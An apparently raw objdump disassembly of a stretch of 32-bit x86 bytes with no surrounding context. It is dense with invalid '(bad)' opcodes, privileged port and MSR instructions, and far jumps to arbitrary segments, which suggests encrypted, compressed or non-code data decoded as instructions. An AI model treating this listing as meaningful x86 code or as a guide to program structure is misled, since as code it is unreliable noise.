  414213:	imul   esi,DWORD PTR [ebp+0x1dbce35d],0x2f69452
  41421d:	(bad)  
  41421e:	mov    ds:0x45fe0c08,al
  414223:	or     eax,DWORD PTR [eax+0x67a03089]
  414229:	cdq    
  41422a:	mov    edi,0xa1d1a34e
  41422f:	adc    al,0x26
  414231:	adc    al,0x4b
  414233:	popf   
  414234:	stos   BYTE PTR es:[edi],al
  414235:	sbb    DWORD PTR [ebx-0x23],ebp
  414238:	mov    edi,0xeba1e894
  41423d:	aaa    
  41423e:	ret    0x7438
  414241:	xor    al,0x90
  414243:	adc    al,0x54
  414245:	jp     0x414208
  414247:	pop    esp
  414248:	and    al,BYTE PTR [eax]
  41424a:	dec    esi
  41424b:	xor    esp,DWORD PTR [edi-0x12]
  41424e:	cmp    DWORD PTR [edi],ebp
  414250:	and    BYTE PTR [ebp+0x28],al
  414253:	mov    dh,0xe4
  414255:	and    eax,0x9716beb7
  41425a:	pop    edi
  41425b:	sub    bh,BYTE PTR [edi+0x5bc1e71d]
  414261:	pop    ebx
  414262:	mov    WORD PTR [edi+0x4d],cs
  414265:	aaa    
  414266:	icebp  
  414267:	adc    eax,0xf193be5e
  41426c:	xchg   edi,eax
  41426d:	or     BYTE PTR [esi+ebp*1+0x62d0fc43],dl
  414274:	(bad)  
  414275:	dec    esi
  414276:	sbb    al,bh
  414278:	inc    esp
  414279:	mov    dh,0x69
  41427b:	inc    edi
  41427c:	addr16 leave 
  41427e:	mov    ebx,0xd149f4bd
  414283:	dec    ecx
  414284:	dec    esp
  414285:	jmp    0x1a1b76b5
  41428a:	dec    esp
  41428b:	in     eax,dx
  41428c:	int3   
  41428d:	popa   
  41428e:	fbstp  TBYTE PTR [esi+0x62a2093]
  414294:	xchg   esp,eax
  414295:	repnz arpl bx,cx
  414298:	sub    BYTE PTR [ebx],bl
  41429a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41429b:	fild   WORD PTR ss:[ebp-0x6cebb413]
  4142a2:	sbb    BYTE PTR [ecx+0x4e1ece4d],bl
  4142a8:	add    dh,dl
  4142aa:	aas    
  4142ab:	mov    eax,DWORD PTR [eax-0x5d8aaa9]
  4142b1:	test   DWORD PTR [eax+0x30],ebp
  4142b4:	nop
  4142b5:	cmp    BYTE PTR [ecx+0x6793f5c0],0x6b
  4142bc:	push   ss
  4142bd:	xchg   edi,eax
  4142be:	cmc    
  4142bf:	push   esp
  4142c0:	bnd jmp 0x41433a
  4142c3:	imul   esp,DWORD PTR [ecx*8+0x18cfd390],0x56
  4142cb:	in     eax,0xd6
  4142cd:	ins    BYTE PTR es:[edi],dx
  4142ce:	nop
  4142cf:	fld    st(2)
  4142d1:	inc    BYTE PTR [ecx+0x3670a7cf]
  4142d7:	lea    esp,ds:0x8d2a599b
  4142dd:	jns    0x4142d3
  4142df:	in     eax,0xf2
  4142e1:	shr    DWORD PTR [eax+0x2b],cl
  4142e4:	pop    ds
  4142e5:	ja     0x414273
  4142e7:	cdq    
  4142e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4142e9:	frstor [edi]
  4142eb:	es ret 
  4142ed:	rcr    cl,cl
  4142ef:	sahf   
  4142f0:	push   ds
  4142f1:	jmp    0xc35d:0x598f0d9b
  4142f8:	cwde   
  4142f9:	sub    eax,0x28622ec7
  4142fe:	(bad)  [eax+0x1b]
  414301:	loopne 0x41434b
  414303:	scas   eax,DWORD PTR es:[edi]
  414304:	ret    0x7e52
  414307:	add    eax,0xebde87bf
  41430c:	aam    0x3b
  41430e:	mov    ah,0xb7
  414310:	mov    cl,0xb
  414312:	xchg   esp,eax
  414313:	clc    
  414314:	add    BYTE PTR [eax],dh
  414316:	mov    ds,WORD PTR [ebp-0x21cbcb8b]
  41431c:	leave  
  41431d:	or     BYTE PTR [eax],al
  41431f:	add    DWORD PTR [ebp-0x73],0x32571e34
  414326:	clc    
  414327:	adc    ecx,0x8746bba8
  41432d:	inc    eax
  41432e:	das    
  41432f:	mov    esi,0x57eb3f15
  414334:	in     al,dx
  414335:	jge    0x41436d
  414337:	mov    esp,0xff64885e
  41433c:	or     BYTE PTR [ebx],dh
  41433e:	mov    esp,0x14ff9882
  414343:	mov    esp,0xee0e9bcf
  414348:	push   ecx
  414349:	pop    ss
  41434a:	mov    esi,esi
  41434c:	mov    fs:0x65bcc41a,al
  414352:	add    DWORD PTR [edi-0x5b],esi
  414355:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414356:	pop    eax
  414357:	int    0xdb
  414359:	cs out 0x9f,al
  41435c:	mov    eax,0x14f4d463
  414361:	push   esi
  414362:	mov    ecx,DWORD PTR ds:0x741d8e22
  414368:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414369:	jo     0x4143c2
  41436b:	xor    al,0x4f
  41436d:	arpl   WORD PTR [ecx-0x60],ax
  414370:	fadd   QWORD PTR [eax-0x3a24ff3a]
  414376:	jbe    0x414398
  414378:	ds jb  0x414379
  41437b:	imul   esp,DWORD PTR [ebx+0x55],0x74
  41437f:	mov    cs,WORD PTR ds:0xb6e09e32
  414385:	inc    ebp
  414386:	shr    DWORD PTR [ebp+edi*2+0x2d7ba0f5],0x41
  41438e:	add    bl,BYTE PTR [ebx-0x1bcacfce]
  414394:	add    esi,esi
  414396:	dec    ebp
  414397:	push   esi
  414398:	into   
  414399:	rcr    ch,cl
  41439b:	push   esp
  41439c:	call   0x59be5088
  4143a1:	(bad)  
  4143a2:	cli    
  4143a3:	aas    
  4143a4:	cmp    eax,0xefad01de
  4143a9:	stos   BYTE PTR es:[edi],al
  4143aa:	js     0x4143ca
  4143ac:	sbb    al,0xff
  4143ae:	xchg   esp,eax
  4143af:	fmul   DWORD PTR [edi-0x313c0ace]
  4143b5:	mov    ebx,0x9026bcde
  4143ba:	xchg   DWORD PTR [esi+edx*2-0xe5adade],edx
  4143c1:	test   eax,0xea38bf8b
  4143c6:	wrmsr  
  4143c8:	and    DWORD PTR gs:[ecx],0x71
  4143cc:	lods   al,BYTE PTR ds:[esi]
  4143cd:	mov    ds:0xbd0bfdd7,eax
  4143d2:	dec    esp
  4143d3:	or     al,0xdb
  4143d5:	inc    edi
  4143d6:	lock pop ecx
  4143d8:	sbb    eax,0x348b86bc
  4143dd:	aaa    
  4143de:	xchg   ecx,eax
  4143df:	scas   al,BYTE PTR es:[edi]
  4143e0:	(bad)  
  4143e1:	out    0x14,eax
  4143e3:	xor    dh,BYTE PTR [ecx]
  4143e5:	and    edx,DWORD PTR [ebp-0x76faab9e]
  4143eb:	adc    al,BYTE PTR [ebp+ebx*1+0x9]
  4143ef:	arpl   di,cx
  4143f1:	mov    BYTE PTR [ebp-0x62],al
  4143f4:	bound  edi,QWORD PTR [esi]
  4143f6:	retf   
  4143f7:	push   ss
  4143f8:	pop    ds
  4143f9:	push   cs
  4143fa:	inc    esp
  4143fb:	cld    
  4143fc:	retf   
  4143fd:	int    0x90
  4143ff:	ja     0x414400
  414401:	fisttp QWORD PTR [ebp+0x60]
  414404:	test   al,0x3f
  414406:	(bad)  
  414407:	xchg   ebp,eax
  414408:	pop    edi
  414409:	sub    dh,0xe7
  41440c:	pop    ecx
  41440d:	mov    esp,0x6aa836b
  414412:	mov    esp,DWORD PTR [eax+0x41adf16d]
  414418:	repz js 0x41441f
  41441b:	data16 aad 0x61
  41441e:	pop    ds
  41441f:	cmp    eax,0x36592462
  414424:	dec    eax
  414425:	ins    DWORD PTR es:[edi],dx
  414426:	sub    ah,al
  414428:	nop
  414429:	and    DWORD PTR [eax],0xffffffd6
  41442c:	cmp    al,0x37
  41442e:	jno    0x414408
  414430:	cwde   
  414431:	clc    
  414432:	fstp   TBYTE PTR ds:0x9283fbad
  414438:	shl    BYTE PTR [edi+0x103452ae],1
  41443e:	pushf  
  41443f:	clc    
  414440:	btr    ebx,esp
  414443:	arpl   WORD PTR [edx+0x6],di
  414446:	pop    edx
  414447:	repz dec ecx
  414449:	push   0x34c3ba12
  41444e:	xchg   edi,eax
  41444f:	js     0x4144ab
  414451:	mov    esi,0xc18922e8
  414456:	iret   
  414457:	jb     0x414466
  414459:	sbb    BYTE PTR [ebp+0x7b],cl
  41445c:	test   al,0xaa
  41445e:	cdq    
  41445f:	popa   
  414460:	mov    dl,BYTE PTR [edi+0xb3404ad]
  414466:	test   DWORD PTR [eax-0x270d08c0],edx
  41446c:	(bad)
  414470:	or     ebx,DWORD PTR [edi+0x3b]
  414473:	dec    esi
  414474:	push   esi
  414475:	out    dx,al
  414476:	mov    ah,0xc5
  414478:	lahf   
  414479:	or     eax,0xeeb899ae
  41447e:	pop    es
  41447f:	pushf  
  414480:	push   0xffffffe8
  414482:	dec    edi
  414483:	test   eax,0x7d78c906
  414488:	pop    es
  414489:	ret    
  41448a:	fcos   
  41448c:	xchg   edx,eax
  41448d:	lahf   
  41448e:	test   edx,edx
  414490:	xchg   edx,eax
  414491:	or     eax,DWORD PTR [eax-0x39ae35ce]
  414497:	ds dec ebx
  414499:	fnsave [edi+0x56b4722d]
  41449f:	aaa    
  4144a0:	sbb    BYTE PTR [edi],0x9f
  4144a3:	mov    bh,0x3e
  4144a5:	and    al,0xff
  4144a7:	mov    bh,cl
  4144a9:	jge    0x4144d7
  4144ab:	stos   DWORD PTR es:[edi],eax
  4144ac:	sub    al,0xe9
  4144ae:	mov    dl,ch
  4144b0:	aad    0xcd
  4144b2:	jg     0x414437
  4144b4:	(bad)  
  4144b5:	(bad)  
  4144b7:	jl     0x4144a5
  4144b9:	cmp    al,0x20
  4144bc:	mov    WORD PTR [edi+0x35],ds
  4144bf:	dec    esi
  4144c0:	and    edx,ecx
  4144c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4144c3:	sti    
  4144c4:	adc    esi,DWORD PTR [ecx]
  4144c6:	mov    bl,0x85
  4144c8:	fwait
  4144c9:	inc    ebx
  4144ca:	mov    al,ds:0x8ae274bb
  4144cf:	shr    DWORD PTR ds:0x24233d9e,cl
  4144d5:	pop    esi
  4144d6:	push   es
  4144d7:	jg     0x414519
  4144d9:	clc    
  4144da:	sub    DWORD PTR [ebp+0x7b],0x1e53bf16
  4144e1:	test   cl,0x4a
  4144e4:	push   cs
  4144e5:	das    
  4144e6:	push   esp
  4144e7:	std    
  4144e8:	push   cs
  4144e9:	inc    edx
  4144ea:	mov    WORD PTR [ebp-0x7b],fs
  4144ed:	ss in  al,0xf7
  4144f0:	dec    ecx
  4144f1:	data16 jnp 0x41454f
  4144f4:	bound  esi,QWORD PTR [ebx+0x52717c99]
  4144fa:	cmp    ebp,ecx
  4144fc:	dec    eax
  4144fd:	mov    WORD PTR [esi-0x20],ds
  414500:	cmp    al,0x32
  414502:	xor    ah,dl
  414504:	mov    dh,BYTE PTR [edi+0x3943a02]
  41450a:	sub    eax,0x924793d1
  41450f:	and    eax,0xc20b31bc
  414514:	or     eax,0x1b9ceb28
  414519:	inc    ecx
  41451a:	sahf   
  41451b:	aas    
  41451c:	push   edx
  41451d:	scas   eax,DWORD PTR es:[edi]
  41451e:	mov    edx,0x94c0e888
  414523:	nop
  414524:	mov    bl,0xde
  414526:	fwait
  414527:	jne    0x414533
  414529:	out    0x6c,al
  41452b:	inc    ebx
  41452c:	sbb    al,0xae
  41452e:	or     bh,0x36
  414531:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414532:	pop    esi
  414533:	dec    esi
  414534:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414535:	fldenv [edi-0x3d]
  414538:	push   eax
  414539:	cwde   
  41453a:	fnsave [ebp+0x71]
  41453d:	das    
  41453e:	shl    bl,1
  414540:	mov    ebx,0x5b899c90
  414545:	mov    ah,BYTE PTR [eax+0x0]
  414548:	cmc    
  414549:	pop    edx
  41454a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41454b:	call   0xdcbedd32
  414550:	jecxz  0x4145c6
  414552:	fldenv [esi]
  414554:	jle    0x4144e1
  414556:	fdivrp st(2),st
  414558:	sar    DWORD PTR [edi],cl
  41455a:	(bad)  
  41455c:	mov    edi,0xddb92f2c
  414561:	aam    0xeb
  414563:	pop    es
  414564:	or     dl,BYTE PTR [ecx-0x34cdc76]
  41456a:	sub    ecx,esp
  41456c:	pop    edx
  41456d:	pop    edi
  41456e:	out    dx,al
  41456f:	mov    bl,0xc2
  414571:	pop    es
  414572:	push   ebp
  414573:	inc    eax
  414574:	call   0x33c138d
  414579:	jmp    0x9a743f11
  41457e:	jecxz  0x4145a6
  414580:	xchg   esp,eax
  414581:	dec    ebx
  414582:	fld    QWORD PTR [ebx+0x69cd4c06]
  414588:	sbb    DWORD PTR [edi+0x73],ebp
  41458b:	add    al,0x7
  41458d:	sub    bh,0x88
  414590:	lods   al,BYTE PTR ds:[esi]
  414591:	ds (bad) 
  414593:	clc    
  414594:	imul   esp,DWORD PTR [ebx+0x29ff60bc],0x4e
  41459b:	loop   0x4145e0
  41459d:	mov    WORD PTR [edi+esi*8-0x20],fs
  4145a1:	pop    ebp
  4145a2:	jmp    0xd063:0x959e6447
  4145a9:	call   0x1955:0xc79997ba
  4145b0:	fsub   QWORD PTR [ebx+ecx*8+0x795b9932]
  4145b7:	iret   
  4145b8:	lahf   
  4145b9:	cmp    dh,BYTE PTR [edi-0x34]
  4145bc:	loop   0x4145e2
  4145be:	xchg   edx,eax
  4145bf:	loope  0x4145d8
  4145c1:	sub    al,0x9d
  4145c3:	mov    edi,0x402fc003
  4145c8:	xor    edi,DWORD PTR [ecx-0x15]
  4145cb:	xlat   BYTE PTR ds:[ebx]
  4145cc:	fwait
  4145cd:	in     al,dx
  4145ce:	in     eax,0xeb
  4145d0:	(bad)  
  4145d1:	test   DWORD PTR [ecx+0x59988fa1],0xfd7dda0c
  4145db:	xor    ebp,DWORD PTR [esi+esi*8+0x6]
  4145df:	ret    0xf1cd
  4145e2:	int3   
  4145e3:	aam    0xc
  4145e5:	repz ds popa 
  4145e8:	sub    BYTE PTR [ebp+0x18],dl
  4145eb:	adc    ecx,DWORD PTR [eax+ebx*1+0x43]
  4145ef:	add    eax,0x3caca3f
  4145f4:	out    0x64,al
  4145f6:	mov    DWORD PTR [eax-0x77],ecx
  4145f9:	push   esp
  4145fa:	sbb    DWORD PTR [ebp-0x17bca247],0x7fd2dacb
  414604:	add    dh,ch
  414606:	jecxz  0x4145fa
  414608:	xchg   ebx,eax
  414609:	std    
  41460a:	sbb    DWORD PTR [ebp+0x4d1d92cb],ecx
  414610:	push   ds
  414611:	int3   
  414612:	test   BYTE PTR [edi],0xa5
  414615:	sar    DWORD PTR [edi-0x5079d739],0x3d
  41461c:	popf   
  41461d:	xor    eax,0xeff05fb2
  414622:	js     0x41467f
  414624:	sbb    DWORD PTR [ebx],0x4f
  414627:	dec    esp
  414628:	out    0x99,eax
  41462a:	jns    0x414676
  41462c:	int3   
  41462d:	xchg   edx,eax
  41462e:	push   esp
  41462f:	mov    ah,0x50
  414631:	loop   0x414601
  414633:	add    eax,0xc84a09
  414638:	retf   0x6c24
  41463b:	push   edi
  41463c:	inc    esp
  41463d:	push   edx
  41463e:	xlat   BYTE PTR ds:[ebx]
  41463f:	imul   esi,DWORD PTR [ebx],0x6c
  414642:	(bad)  
  414643:	enter  0x9a07,0x3a
  414647:	pop    ebx
  414648:	out    dx,al
  414649:	sbb    edx,DWORD PTR [ebx]
  41464b:	pop    edi
  41464c:	pushf  
  41464d:	pushf  
  41464e:	sub    BYTE PTR [ebx],0x76
  414651:	loopne 0x4146ab
  414653:	push   ss
  414654:	jnp    0x41469f
  414656:	xor    eax,0x75a4e5ce
  41465b:	sahf   
  41465c:	cmp    ebp,esi
  41465e:	fild   WORD PTR [eax-0x69c3dd7c]
  414664:	rcl    DWORD PTR [ecx+0x625871b1],cl
  41466a:	enter  0x289a,0x96
  41466e:	add    eax,0xac073eaf
  414673:	xor    bh,BYTE PTR [ecx+edx*8+0x110e55a1]
  41467a:	and    al,0x9
  41467c:	xchg   ebp,eax
  41467d:	xor    cl,BYTE PTR [edi-0x7915ad5f]
  414683:	mov    fs,WORD PTR [eax-0x1e]
  414686:	imul   eax,DWORD PTR [edx-0x51],0xffffffc3
  41468a:	loope  0x41463f
  41468c:	mov    ds:0xc5f71ff4,eax
  414691:	inc    eax
  414692:	sbb    cl,dh
  414694:	aad    0xa0
  414696:	call   0xab4bb37e
  41469b:	out    0x84,al
  41469d:	push   ds
  41469e:	mov    esp,0x26bec7d1
  4146a3:	add    al,BYTE PTR [ecx]
  4146a5:	ss jmp 0xf23c2777
  4146ab:	inc    edi
  4146ac:	mov    dh,0xde
  4146ae:	pusha  
  4146af:	ret    
  4146b0:	fs pop edi
  4146b2:	fs popa 
  4146b4:	mov    ds:0x9a4e57c6,eax
  4146b9:	inc    edi
  4146ba:	mov    esp,DWORD PTR [ebp+0x29cf55d2]
  4146c0:	(bad)  
  4146c2:	mov    edi,0x37c4c76
  4146c7:	pop    eax
  4146c8:	pop    ebx
  4146c9:	dec    esi
  4146ca:	push   DWORD PTR [ebx]
  4146cc:	pop    ebx
  4146cd:	into   
  4146ce:	xlat   BYTE PTR ds:[ebx]
  4146cf:	psraw  mm5,QWORD PTR [ebp-0x71]
  4146d3:	rcl    cl,1
  4146d5:	mov    ebx,0x88e88efb
  4146da:	dec    ecx
  4146db:	int    0x6
  4146dd:	mov    cl,0x7f
  4146df:	mov    esi,0x6e9b8872
  4146e4:	outs   dx,BYTE PTR ds:[esi]
  4146e5:	and    ebp,DWORD PTR [ecx-0x4a01862b]
  4146eb:	(bad)  
  4146ec:	shl    BYTE PTR [edx-0x26eb07e6],1
  4146f2:	pop    ds
  4146f3:	add    BYTE PTR [ebx],dl
  4146f5:	and    dh,ch
  4146f7:	out    0xc5,al
  4146f9:	pusha  
  4146fa:	mov    esi,0xc43dbd41
  4146ff:	inc    ecx
  414700:	ds into 
  414702:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414703:	mov    ds:0x19ebdf54,al
  414708:	dec    ebx
  414709:	dec    ebx
  41470a:	repnz sbb dl,BYTE PTR [ebx-0x2f]
  41470e:	pop    edx
  41470f:	mov    esp,?
  414711:	xchg   BYTE PTR [esi],bl
  414713:	fidiv  WORD PTR [eax+eiz*4]
  414716:	sbb    DWORD PTR [edx-0x75],0xa02f1279
  41471d:	mov    al,0xca
  41471f:	fist   DWORD PTR ds:0x63626a16
  414725:	js     0x414754
  414727:	je     0x4146bb
  414729:	std    
  41472a:	sti    
  41472b:	loopne 0x41477a
  41472d:	popf   
  41472e:	mov    BYTE PTR [ecx+0x24],bh
  414731:	pop    edi
  414732:	sub    dh,ah
  414734:	xchg   esp,eax
  414735:	pusha  
  414736:	add    eax,0xb796bd
  41473b:	mov    bl,BYTE PTR [ebp+0x21]
  41473e:	int    0x22
  414740:	adc    esp,DWORD PTR [eax+esi*1]
  414743:	sbb    ch,0x13
  414746:	add    DWORD PTR [edi-0x1fc20bae],0xc78271a2
  414750:	mov    ebx,0xdfa6023
  414755:	sub    al,0x2
  414757:	add    eax,0x8c43ec74
  41475c:	arpl   WORD PTR [ebp+ebp*1-0x7f],sp
  414760:	xchg   ebx,eax
  414761:	pop    edi
  414762:	adc    eax,0x97a5ef60
  414767:	inc    eax
  414768:	cmp    eax,0x92805074
  41476d:	in     eax,dx
  41476e:	(bad)  
  41476f:	in     al,0xf6
  414771:	fst    QWORD PTR ds:[edi]
  414774:	inc    ebx
  414775:	cmp    cl,BYTE PTR [esi]
  414777:	clc    
  414778:	push   edx
  414779:	mov    dl,0xad
  41477b:	test   eax,0x6cafc153
  414780:	ins    DWORD PTR es:[edi],dx
  414781:	iret   
  414782:	dec    ebx
  414783:	jo     0x414707
  414785:	add    BYTE PTR [edx+0x74],bl
  414788:	add    ah,dh
  41478a:	std    
  41478b:	sub    ah,ch
  41478d:	mov    edx,0xe9af6804
  414792:	cwde   
  414793:	cmp    eax,0xe6a1939
  414798:	movd   DWORD PTR [esi+ebp*8+0xe],mm4
  41479d:	sbb    al,0xf5
  41479f:	in     al,dx
  4147a0:	cmc    
  4147a1:	push   edx
  4147a2:	and    al,0x24
  4147a4:	test   eax,0xcc1f0a9e
  4147a9:	sbb    DWORD PTR [eax-0x60],eax
  4147ac:	add    DWORD PTR [edi],0x6d
  4147af:	jl     0x4147e5
  4147b1:	(bad)  
  4147b2:	cmp    al,BYTE PTR [ecx+0x6725d0d0]
  4147b8:	fcom   QWORD PTR [ecx-0x6c]
  4147bb:	std    
  4147bc:	inc    esp
  4147bd:	xchg   edi,eax
  4147be:	les    ebx,FWORD PTR [edi]
  4147c0:	es inc esp
  4147c2:	mov    dl,0x7b
  4147c4:	xchg   esp,eax
  4147c5:	cmp    ah,BYTE PTR [edx+esi*8+0x5e184638]
  4147cc:	mov    cl,0x69
  4147ce:	loop   0x4147a6
  4147d0:	dec    eax
  4147d1:	es sub eax,0xd7e47944
  4147d7:	xor    cl,BYTE PTR [esi]
  4147d9:	inc    esp
  4147da:	xchg   esi,eax
  4147db:	dec    ebx
  4147dc:	mov    ds:0x554ce0c0,eax
  4147e1:	mov    bh,0x13
  4147e3:	and    dl,BYTE PTR [ebx]
  4147e5:	push   0x19a6abd1
  4147ea:	adc    BYTE PTR [edi+esi*4],bh
  4147ed:	loop   0x41485a
  4147ef:	mov    bl,0x88
  4147f1:	sbb    eax,0x9db98fe8
  4147f6:	pop    ebx
  4147f7:	push   ss
  4147f8:	or     al,0x43
  4147fa:	dec    esp
  4147fb:	cld    
  4147fc:	leave  
  4147fd:	scas   eax,DWORD PTR es:[edi]
  4147fe:	sti    
  4147ff:	cmp    DWORD PTR [esi+0x3c1ce53],0x24
  414806:	push   edx
  414807:	sbb    DWORD PTR [ebx+0x1f],esp
  41480a:	xor    dh,dh
  41480c:	push   esp
  41480d:	shl    DWORD PTR [eax+0x7cc72e7a],1
  414813:	js     0x41481f
  414815:	xchg   ebp,eax
  414816:	xchg   al,ch
  414818:	mov    ebp,0x323f86f
  41481d:	adc    dh,bh
  41481f:	push   ss
  414820:	xchg   edi,eax
  414821:	jae    0x414836
  414823:	ins    DWORD PTR es:[edi],dx
  414824:	daa    
  414825:	dec    esi
  414826:	xchg   BYTE PTR [edx],dl
  414828:	sub    eax,0x5d2f40f
  41482d:	ret    
  41482e:	sti    
  41482f:	daa    
  414830:	out    0x62,al
  414832:	pop    ebx
  414833:	push   esi
  414834:	inc    esp
  414835:	imul   edx,DWORD PTR [ecx-0x47a8f389],0xb1e88a8a
  41483f:	loop   0x4147de
  414841:	add    DWORD PTR [ebx],eax
  414843:	push   ebx
  414844:	inc    ecx
  414845:	popa   
  414846:	and    al,0x18
  414848:	push   esp
  41484a:	add    al,0x11
  41484c:	test   BYTE PTR [ebx],ah
  41484e:	outs   dx,BYTE PTR ds:[esi]
  41484f:	inc    ebx
  414850:	push   esp
  414851:	push   cs
  414852:	push   edx
  414853:	nop
  414854:	shl    BYTE PTR [ebx],0xc6
  414857:	leave  
  414858:	push   0x1660d651
  41485d:	push   ss
  41485e:	es or  eax,0x793aed00
  414864:	arpl   WORD PTR [esp+ebx*8],si
  414867:	fidivr DWORD PTR [ebx+0x27973347]
  41486d:	out    0xce,al
  41486f:	adc    dl,al
  414871:	je     0x414835
  414873:	adc    DWORD PTR [ecx+esi*4],edi
  414876:	xor    bl,BYTE PTR [eax+0x6428a8fc]
  41487c:	les    eax,FWORD PTR [edx+0x3f]
  41487f:	adc    BYTE PTR [ecx+0x34],ah
  414882:	xor    al,0xce
  414884:	jmp    0x56b4899e
  414889:	jne    0x41487b
  41488b:	test   al,0x25
  41488d:	lods   al,BYTE PTR ds:[esi]
  41488e:	loopne 0x41483b
  414890:	out    0x40,al
  414892:	test   DWORD PTR [ecx-0x78],esp
  414895:	add    BYTE PTR [ebp-0xdef756e],ah
  41489b:	daa    
  41489c:	adc    esp,edx
  41489e:	sub    ecx,esp
  4148a0:	mov    al,ds:0x7cb3f26
  4148a5:	lds    edx,FWORD PTR [ebx-0x40507f45]
  4148ab:	adc    DWORD PTR [edi],ebx
  4148ad:	out    0xe1,eax
  4148af:	popf   
  4148b0:	stc    
  4148b1:	add    ch,BYTE PTR [ecx+0x1]
  4148b4:	retf   0xc6b6
  4148b7:	ins    DWORD PTR es:[edi],dx
  4148b8:	mov    dh,0x11
  4148ba:	sub    dh,BYTE PTR [ebp-0x38a9b877]
  4148c0:	cmp    DWORD PTR [eax],edx
  4148c2:	mov    edx,ebp
  4148c4:	fst    DWORD PTR [eax+0x34]
  4148c7:	sub    ebp,esp
  4148c9:	push   esp
  4148ca:	push   es
  4148cb:	pop    ebx
  4148cc:	call   0x35da:0xf6b41f40
  4148d3:	clc    
  4148d4:	cmc    
  4148d5:	push   edx
  4148d6:	pop    ecx
  4148d7:	xchg   ebp,eax
  4148d8:	or     DWORD PTR [ecx+0x736d3acc],ebp
  4148de:	out    0x45,eax
  4148e0:	jne    0x414878
  4148e2:	mov    cl,0x83
  4148e4:	test   al,0x54
  4148e6:	outs   dx,DWORD PTR ds:[esi]
  4148e7:	push   edx
  4148e8:	cmp    BYTE PTR [edi-0x48727e28],0x31
  4148ef:	fsubr  DWORD PTR [ecx-0x166e87c0]
  4148f5:	es mov bl,0x66
  4148f8:	bswap  eax
  4148fa:	ds dec esi
  4148fc:	inc    esi
  4148fd:	xchg   esp,eax
  4148fe:	or     BYTE PTR [ebx],dl
  414900:	fld    st(7)
  414902:	hlt    
  414903:	mov    dh,0x4c
  414905:	lahf   
  414906:	xchg   ebp,eax
  414907:	dec    edx
  414908:	push   esi
  414909:	xchg   BYTE PTR ds:0x523473a2,bh
  41490f:	jns    0x4148a8
  414911:	cwde   
  414912:	mov    ds:0x73359f4f,eax
  414917:	(bad)  [ebp+eiz*4-0x24]
  41491b:	retf   0xc71b
  41491e:	sahf   
  41491f:	imul   edx,eax,0x52
  414922:	imul   eax,esp,0x41f6b08b
  414928:	jns    0x4148f5
  41492a:	mov    bl,BYTE PTR [edx]
  41492c:	pop    ss
  41492d:	std    
  41492e:	push   es
  41492f:	dec    esi
  414930:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414931:	popf   
  414932:	sar    DWORD PTR [edx+0x7d],0xeb
  414936:	mov    ebp,0x7774ebb
  41493b:	or     al,0x9d
  41493d:	fwait
  41493e:	jno    0x41490b
  414940:	pop    edi
  414941:	xchg   ebx,eax
  414942:	mov    ah,0x6
  414944:	mov    bh,0x72
  414946:	loop   0x4148f4
  414948:	push   cs
  414949:	in     eax,0x72
  41494b:	out    dx,eax
  41494c:	dec    ebx
  41494d:	pop    ecx
  41494e:	pushf  
  41494f:	outs   dx,BYTE PTR ds:[si]
  414951:	or     bh,BYTE PTR [ebp+0x1c]
  414954:	add    edx,esi
  414956:	fsubr  DWORD PTR [ebp+0x5e]
  414959:	and    al,ah
  41495b:	mov    ch,0xa8
  41495d:	cmp    esp,DWORD PTR [ebp+ecx*1+0x12]
  414961:	push   es
  414962:	push   eax
  414963:	call   0x4316:0x1a936975
  41496a:	repnz lahf 
  41496c:	ds int3 
  41496e:	jo     0x41491b
  414970:	fidivr WORD PTR [ecx+0x4c8e04bc]
  414976:	mov    ds:0xaa8ce184,al
  41497b:	popf   
  41497c:	(bad)  [edi]
  41497e:	mov    ecx,0x9bdbc100
  414983:	push   cs
  414984:	pop    edx
  414985:	adc    eax,0x828cbf13
  41498a:	pop    ds
  41498b:	xor    BYTE PTR [ecx+0x76a6d83e],ah
  414991:	popa   
  414992:	and    dh,BYTE PTR [ecx+0x55e981a]
  414998:	xchg   ebx,eax
  414999:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41499a:	fisub  DWORD PTR [ecx-0x1634337c]
  4149a0:	scas   eax,DWORD PTR es:[edi]
  4149a1:	ret    
  4149a2:	out    0xc0,eax
  4149a4:	push   0xabebfa0
  4149a9:	das    
  4149aa:	jmp    0x1ac8:0x910c34c0
  4149b1:	retf   0x395e
  4149b4:	push   edx
  4149b5:	or     eax,0x7777bf6a
  4149ba:	scas   al,BYTE PTR es:[edi]
  4149bb:	sbb    BYTE PTR [edx],ch
  4149bd:	mov    ds:0xd660cc7a,eax
  4149c2:	adc    eax,0x87bba03b
  4149c7:	retf   
  4149c8:	sbb    cl,BYTE PTR [ebx+0x6d]
  4149cb:	jne    0x4149e1
  4149cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4149ce:	fcom   DWORD PTR [edi-0x9]
  4149d1:	fs xchg edx,eax
  4149d3:	sub    al,BYTE PTR [esi-0x29]
  4149d6:	adc    al,0x72
  4149d8:	mov    bl,0xb7
  4149da:	inc    ebp
  4149db:	sub    BYTE PTR [eax+edi*4+0x20],bl
  4149df:	or     BYTE PTR [ebp+0x42],bh
  4149e2:	cmc    
  4149e3:	jp     0x41497f
  4149e5:	xchg   esp,eax
  4149e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4149e7:	mov    esp,?
  4149e9:	icebp  
  4149ea:	sbb    eax,0x1c32cd95
  4149ef:	jae    0x414a36
  4149f1:	int3   
  4149f2:	push   ebx
  4149f3:	test   al,0xff
  4149f5:	icebp  
  4149f6:	shr    ah,cl
  4149f8:	mov    ch,ah
  4149fa:	fild   WORD PTR [ebp-0x41]
  4149fd:	or     al,0x37
  4149ff:	jmp    0x88a4:0xa67c2a7c
  414a06:	adc    al,0x8f
  414a08:	jmp    0x5a7c8d1b
  414a0d:	jmp    0x6c51865c
  414a12:	push   eax
  414a13:	cmp    DWORD PTR [edi-0x6b9c9e98],edx
  414a19:	jne    0x414a20
  414a1b:	in     al,0x17
  414a1d:	pop    ecx
  414a1e:	mov    ch,0xa9
  414a20:	xor    eax,edx
  414a22:	(bad)  
